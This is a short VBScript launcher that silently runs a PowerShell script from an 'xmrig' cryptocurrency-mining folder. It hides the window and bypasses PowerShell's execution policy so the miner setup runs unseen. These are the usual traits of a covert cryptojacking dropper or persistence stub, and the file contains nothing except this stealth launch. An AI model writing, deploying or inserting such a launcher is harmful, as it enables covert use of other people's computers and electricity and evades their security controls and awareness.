Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File ""C:\mining\xmrig\setup_and_run.ps1""", 0, False